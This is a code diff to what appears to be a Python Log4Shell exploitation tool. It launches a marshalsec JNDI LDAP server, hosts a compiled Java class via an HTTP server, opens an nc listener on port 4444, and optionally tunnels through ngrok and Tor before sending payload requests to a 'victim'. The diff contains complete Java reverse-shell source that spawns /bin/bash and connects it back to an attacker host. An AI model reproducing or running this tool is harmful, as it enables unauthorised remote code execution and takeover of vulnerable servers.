@@ -12,6 +12,7 @@ import argparse
 from sys import prefix
 from async_timeout import timeout
 from git import Repo
+from py import process
 
 class start_LDAP_Server():
 
@@ -25,7 +26,10 @@ class start_LDAP_Server():
 
     def __del__(self):
         if hasattr(self, "proc"):
+            self.proc.terminate()
+            self.proc.kill()
             self.proc.send_signal(subprocess.signal.SIGKILL)
+            end()
 
     def clear(self):
         try:
@@ -44,6 +48,7 @@ class start_LDAP_Server():
             self.cmd = self.cmd
             try:
                 self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
+                running_process.append(self.proc.pid)
                 while True:
                     output = self.proc.stdout.readline()
                     if output == '' and self.proc.poll() is not None:
@@ -55,9 +60,8 @@ class start_LDAP_Server():
                     elif 'Send LDAP reference result for' in output.strip().decode():
                         self.msg = output.strip().decode()
                         self.stop_control = True
-                        self.proc.terminate()
-                        self.proc.kill()
-                        self.proc.send_signal(subprocess.signal.SIGKILL)
+                        print("\nLDAP server received:")
+                        print(output.strip().decode())
                 self.proc.poll()
             except:
                 pass
@@ -66,6 +70,27 @@ class start_LDAP_Server():
             self.clear()
             self.run()
         return
+
+class HTTP:
+    def __init__(self, port_http_server):
+        self.port = port_http_server
+
+    def __del__(self):
+        if hasattr(self, "proc"):
+            self.proc.terminate()
+            self.proc.kill()
+            self.proc.send_signal(subprocess.signal.SIGKILL)
+
+    def run(self):
+        self.proc = subprocess.run('exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --directory ' + abs_path + path_http_server + ' &', shell=True)
+        return
+
+def end():
+    global running_process
+    os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
+    for pid in running_process:
+        os.system("kill -9 " + str(pid))
+    os.system("kill -9 " + str(os.getpid()))
 
 def clear_process():
     p = subprocess.run("kill -9 $(ps aux | grep 'marshalsec.jndi.LDAPRefServer' | grep 'SNAPSHOT' | awk 'NR==1{ print $2 }')", shell=True, capture_output=True, text=True)
@@ -82,7 +107,9 @@ def execute(list_cmd, process):
         if not process.stop_control:
             list_code.append(code)
             print("\nSending to victim:\n" + cmd)
-            subprocess.run(shlex.split(cmd))
+            p = subprocess.run(shlex.split(cmd))
+            running_process.append(p.pid)
+            
         else:
             msg = process.msg
             break
@@ -93,19 +120,22 @@ def execute(list_cmd, process):
         print("\n\nFound command:\n\n" + cmd)
         cmd = cmd.replace('/' + result_code + '}', '/#' + name_file + '}')
         print("\nSending:\n" + cmd)
-        subprocess.run(shlex.split(cmd))
+        b = subprocess.run(shlex.split(cmd))
+        running_process.append(b.pid)
         #end()
     else:
         print('Command not found in list')
 
 def ngrok_start():
     global use_tor
-    os.chdir(os.getcwd() + '/ngrok_tunnel')
+    os.chdir(abs_path + '/ngrok_tunnel')
     if use_tor:
         cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel_tor.yml'
     else:
         cmd = 'exo-open --launch TerminalEmulator ngrok start --all --config tunnel.yml'
-    return subprocess.run(shlex.split(cmd))
+    subprocess.run(shlex.split(cmd))
+    
+    return
 
 def ngrok_get():
     try:
@@ -147,12 +177,12 @@ def ngrok_create(auth_token, port_http_server, port_ldap_server):
     except subprocess.CalledProcessError:
         print("File ngrok_tunnel/tunnel.yml or ngrok_tunnel/tunnel_tor.yml not exist")
 
-    f = open(os.getcwd() + '/ngrok_tunnel/tunnel.yml', "w")
+    f = open(abs_path + '/ngrok_tunnel/tunnel.yml', "w")
     for i in string_ngrok.split(';'):
         f.write(i + '\n')
     f.close()
 
-    f = open(os.getcwd() + '/ngrok_tunnel/tunnel_tor.yml', "w")
+    f = open(abs_path + '/ngrok_tunnel/tunnel_tor.yml', "w")
     for i in string_ngrok_tor.split(';'):
         f.write(i + '\n')
     f.close()
@@ -164,93 +194,28 @@ def git_clone():
         os.makedirs(path + "/" + path_ldap_server.split('/')[1])
         Repo.clone_from(git_url, path + path_ldap_server)
 
-def end():
-    return os.system("kill -9 " + str(os.getpid()))
-
 def verify_server(process):
-    global host_http, port_ldap_server
+    global host_http, port_ldap_server, host_http_ngrok
     while not process.forward_progress:
         time.sleep(3)
     try:
         clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        clientsocket.connect((host_http, int(port_ldap_server)))
+        clientsocket.connect((host_http_ngrok, int(port_ldap_server)))
         clientsocket.sendall(b"Hi LDAP!")
         clientsocket.close()
         return True
     except Exception as e:
         if e.strerror:
             return False
-
-def to_process(commands):
-    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path
-    
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        time.sleep(1)
-        p0 = executor.submit(clear_process,)
-        if use_ngrok:
-            p1 = executor.submit(ngrok_start)
-            p2 = executor.submit(ngrok_get,)
-            result = p2.result()
-            add_tcp = False
-            for a in result['tunnels']:
-                if a['proto'] == 'http':
-                    host_http = a['public_url'].split('//')[1]
-                    port_http_server = ''
-                elif a['proto'] == 'tcp':
-                    if not add_tcp:
-                        add_tcp = True
-                        host_tcp = a['public_url'].split('//')[1].split(':')[0]
-                        port_ldap_server = a['public_url'].split(':')[2]
-                    else:
-                        host_nc = a['public_url'].split('//')[1].split(':')[0]
-                        port_nc_server = a['public_url'].split(':')[2]
-        else:
-            pass
-        port = ":" + port_http_server
-
-        http_server = HTTP(port_http_server)
-        try:
-            p5 = executor.submit(http_server.run, )
-            p5.result(timeout=5)
-        except concurrent.futures.TimeoutError:
-            pass
-
-        p7 = executor.submit(netcat,)
-
-        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port + '/#' + name_file +'"'
-        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_server)
-        if (os.path.isfile(abs_path + path_ldap_server + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
-            timeout = 1
-        else:
-            timeout = 20
-        try:
-            p3 = executor.submit(ldap_server.run,)
-            p3.result(timeout=timeout)
-        except concurrent.futures.TimeoutError:
-            pass
         
-        progress = False
-        try:
-            p4 = executor.submit(verify_server, ldap_server)
-            progress = p4.result(timeout=30)
-        except concurrent.futures.TimeoutError:
-            pass
-
-        if progress:
-            pass
-        else:
-            print("LDAP server loading error. Restart aplication.")
-            end()
-
-        p6 = executor.submit(execute, commands, ldap_server)
-
-def netcat():
+def ncat():
     cmd = 'exo-open --launch TerminalEmulator nc -lnvp ' + port_nc_server + ' &'
-    subprocess.call([cmd], shell=True)
+    subprocess.run(cmd, shell=True)
     return
 
 def readfile(burp_file):
     global vuln_server, method, headers, data
+    os.chdir(abs_path)
     headers_end = False
     headers = []
     data = []
@@ -284,7 +249,7 @@ def check(list):
     return False
 
 def prepare_list_commands():
-    global use_tor, port_tor_tunnel, method, vuln_server, headers, data
+    global use_tor, port_tor_tunnel, method, vuln_server, headers, data, host_tcp, port_ldap_server
     
     string_tor = ' '
     str_header = ' '
@@ -324,43 +289,6 @@ def prepare_list_commands():
     
     return commands
 
-def initialize():
-    commands = []
-    if burp_file:
-        commands = readfile(burp_file)
-    os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
-    git_clone()
-    create_class_java()
-    if use_ngrok:
-        ngrok_verify()
-        if recreate:
-            if not auth_token:
-                print("You must to use auth token for ngrok")
-                exit(0)
-            else:
-                ngrok_create(auth_token, port_http_server, port_ldap_server )
-        else:
-            if not auth_token:
-                print("You must to use auth token for ngrok")
-                exit(0)
-            elif not ngrok_verify_file() or not ngrok_verify_file_tor():
-                ngrok_create(auth_token, port_http_server, port_ldap_server )
-
-    to_process(commands)
-
-class HTTP:
-    def __init__(self, port_http_server):
-        self.port = port_http_server
-
-    def __del__(self):
-        if hasattr(self, "proc"):
-            self.proc.terminate()
-            self.proc.kill()
-            self.proc.send_signal(subprocess.signal.SIGKILL)
-
-    def run(self):
-        self.proc = subprocess.call(['exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --bind ' + host_http + ' --directory ' + abs_path + path_http_server + ' &'], shell=True)
-
 def compile_java(java_file):
     os.chdir(abs_path + path_http_server)
     command = 'javac -verbose ' + java_file
@@ -371,7 +299,8 @@ def compile_java(java_file):
     return
 
 def create_class_java():
-    string_class_java = 'import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class ' + name_file + ' {  public ' + name_file + '() throws Exception {    String host="' + host_nc + '";    int port=' + port_nc_server + ';    String cmd="/bin/bash";    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();    Socket s=new Socket(host,port);    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();    OutputStream po=p.getOutputStream(),so=s.getOutputStream();    while(!s.isClosed()) {      while(pi.available()>0)        so.write(pi.read());      while(pe.available()>0)        so.write(pe.read());      while(si.available()>0)        po.write(si.read());      so.flush();      po.flush();      Thread.sleep(50);      try {        p.exitValue();        break;      }      catch (Exception e){      }    };    p.destroy();    s.close();  }}'
+    global port_nc_ngrok, host_nc
+    string_class_java = 'import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class ' + name_file + ' {  public ' + name_file + '() throws Exception {    String host="' + host_nc + '";    int port=' + port_nc_ngrok + ';    String cmd="/bin/bash";    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();    Socket s=new Socket(host,port);    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();    OutputStream po=p.getOutputStream(),so=s.getOutputStream();    while(!s.isClosed()) {      while(pi.available()>0)        so.write(pi.read());      while(pe.available()>0)        so.write(pe.read());      while(si.available()>0)        po.write(si.read());      so.flush();      po.flush();      Thread.sleep(50);      try {        p.exitValue();        break;      }      catch (Exception e){      }    };    p.destroy();    s.close();  }}'
     string = string_class_java.split(";")
     if not (os.path.isdir(abs_path + path_http_server)):
         os.makedirs(abs_path + path_http_server)
@@ -404,10 +333,114 @@ def create_class_java():
     f.close()
     compile_java(name_file + ".java")
 
+def to_process():
+    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path, host_http_ngrok, port_nc_ngrok
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        time.sleep(1)
+        p0 = executor.submit(clear_process,)
+        port = ":" + port_http_server
+        host_http_ngrok = host_http
+        if use_ngrok:
+            try:
+                p1 = executor.submit(ngrok_start,)
+                p1.result(timeout=5)
+            except concurrent.futures.TimeoutError:
+                pass
+            p2 = executor.submit(ngrok_get,)
+            result = p2.result()
+            add_tcp = False
+            for a in result['tunnels']:
+                if a['proto'] == 'http':
+                    host_http_ngrok = a['public_url'].split('//')[1]
+                elif a['proto'] == 'tcp':
+                    pt = a['config']['addr'].split(':')[1]
+                    if pt == port_nc_server:
+                        host_nc = a['public_url'].split('//')[1].split(':')[0]
+                        port_nc_ngrok = a['public_url'].split(':')[2]
+                    elif pt == port_ldap_server:
+                        host_tcp = a['public_url'].split('//')[1].split(':')[0]
+                        port_ldap_server = a['public_url'].split(':')[2]
+            port = ""
+        else:
+            pass
+        
+        create_class_java()
+
+        commands = []
+        if burp_file:
+            commands = readfile(burp_file)
+
+        http_server = HTTP(port_http_server)
+
+        if use_ncat:
+            try:
+                p5 = executor.submit(http_server.run, )
+                p5.result(timeout=5)
+            except concurrent.futures.TimeoutError:
+                pass
+
+            p7 = executor.submit(ncat,)
+
+        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http_ngrok + port + '/#' + name_file +'"'
+        print(command_server_ldap)
+        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_server)
+        if (os.path.isfile(abs_path + path_ldap_server + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
+            timeout = 1
+        else:
+            timeout = 20
+        try:
+            p3 = executor.submit(ldap_server.run,)
+            j = p3.result(timeout=timeout)
+        except concurrent.futures.TimeoutError:
+            pass
+        
+        progress = False
+        try:
+            p4 = executor.submit(verify_server, ldap_server)
+            progress = p4.result(timeout=30)
+        except concurrent.futures.TimeoutError:
+            pass
+
+        if progress:
+            pass
+        else:
+            print("LDAP server loading error. Restart aplication.")
+            end()
+
+        p6 = executor.submit(execute, commands, ldap_server)
+
+def initialize():
+    
+    try:
+        os.system("kill -9 $(ps aux | grep 'http.server' | awk 'NR==1{ print $2 }')")
+    except:
+        pass
+    git_clone()
+    
+    if use_ngrok:
+        ngrok_verify()
+        if recreate:
+            if not auth_token:
+                print("You must to use auth token for ngrok")
+                exit(0)
+            else:
+                ngrok_create(auth_token, port_http_server, port_ldap_server )
+        else:
+            if not auth_token:
+                print("You must to use auth token for ngrok")
+                exit(0)
+            elif not ngrok_verify_file() or not ngrok_verify_file_tor():
+                ngrok_create(auth_token, port_http_server, port_ldap_server )
+
+    to_process()
+
 if __name__ == "__main__":
+    running_process = []
     name_file = 'log4jRCE'
     hostname = socket.gethostname()
     host_http = socket.gethostbyname(hostname)
+    host_http_ngrok = host_http
     host_tcp = host_http
     host_nc = host_tcp
     path_ldap_server = "/LDAP_Service/marshalsec"
@@ -420,10 +453,11 @@ if __name__ == "__main__":
     parser.add_argument("-v", "--vns", type=str, help="Host vulnerable")
     parser.add_argument("-a", "--auth", type=str, help="Ngrok authtoken")
     parser.add_argument("-ngku", "--use_ngrok", help="Use ngrok", action="store_true")
+    parser.add_argument("-nc", "--use_ncat", help="Use ncat", action="store_true")
     parser.add_argument("-rctn", "--rec_ng_file", help="Recreate ngrok file tunnels", action="store_true")
     parser.add_argument("-pls", "--port_ldap_server", type=int, help="Port of ldap server")
     parser.add_argument("-phs", "--port_http_server", type=int, help="Port of http server")
-    parser.add_argument("-pns", "--port_nc_listener", type=int, help="Port of netcat listener")
+    parser.add_argument("-pns", "--port_nc_listener", type=int, help="Port of ncat listener")
     parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="Port of tor tunnel listener")
     parser.add_argument("-t", "--tor_proxy", help="Use tor proxy", action="store_true")
     parser.add_argument("-r", "--file", help="Burpsuit file")
@@ -434,7 +468,8 @@ if __name__ == "__main__":
 
     port_ldap_server = '1389'
     port_http_server = '8000'
-    port_nc_server = '1234'
+    port_nc_server = '4444'
+    port_nc_ngrok = port_nc_server
     port_tor_tunnel = '9050'
     use_ngrok = False
     recreate = False
@@ -459,6 +494,7 @@ if __name__ == "__main__":
     if args.data: data = [args.data]
     if args.headers: headers = args.headers
     if args.method: method = args.method
+    if args.use_ncat: use_ncat = args.use_ncat
 
     if not vuln_server and not burp_file:
         parser.print_help()
